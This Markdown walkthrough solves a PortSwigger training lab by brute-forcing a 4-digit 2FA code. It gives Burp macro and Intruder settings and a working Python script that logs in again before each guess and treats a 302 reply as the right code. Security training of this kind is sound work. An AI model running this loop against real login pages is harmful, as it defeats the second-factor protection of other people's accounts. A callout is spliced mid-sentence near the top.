# Lab 05 — 2FA bypass using a brute-force attack

> **Expert** · [Official lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)

**Entry point:** `POST /login2` (`mfa-code`) — two wrong codes log you out,

> 🔧 **Burp Community alternative:** the tool named below is Pro-only — the free replacement is described in the steps.
so each attempt needs a fresh login.

## Solution

1. Confirm: wrong code twice → session killed. Solution = automate
   re-login before every guess.
2. **Session handling rule** (Burp Settings → Sessions → Add):
   scope = all URLs; action = **run a macro** with the recorded sequence
   `GET /login` → `POST /login` (carlos:montoya) → `GET /login2`.
3. Intruder on `POST /login2`: payload position = `mfa-code`, payload type
   **Numbers** 0–9999 (4 digits, no fractions), and put the attack in a
   **resource pool** with maximum concurrent requests = 1 (ordering matters).
4. Run. The single **302** response is the correct code.
5. Right-click the 302 → *Show response in browser* → open it → My account —
   lab solved.

**Community alternative (no Session handling rules — Pro-only):** a short
Python script re-logs-in before every guess:

```python
import requests

base = 'https://YOUR-LAB-ID.web-security-academy.net'
for code in range(10000):
    s = requests.Session()
    s.post(f'{base}/login', data={'username': 'carlos', 'password': 'montoya'})
    s.get(f'{base}/login2')
    r = s.post(f'{base}/login2', data={'mfa-code': f'{code:04d}'}, allow_redirects=False)
    if r.status_code == 302:
        print('MFA code:', f'{code:04d}')
        break
```

(Turbo Intruder — free extension — is the fast in-Burp option.)

## Notes

Codes reset during the attack; re-running the attack (or Turbo Intruder)
eventual hits the fresh code.
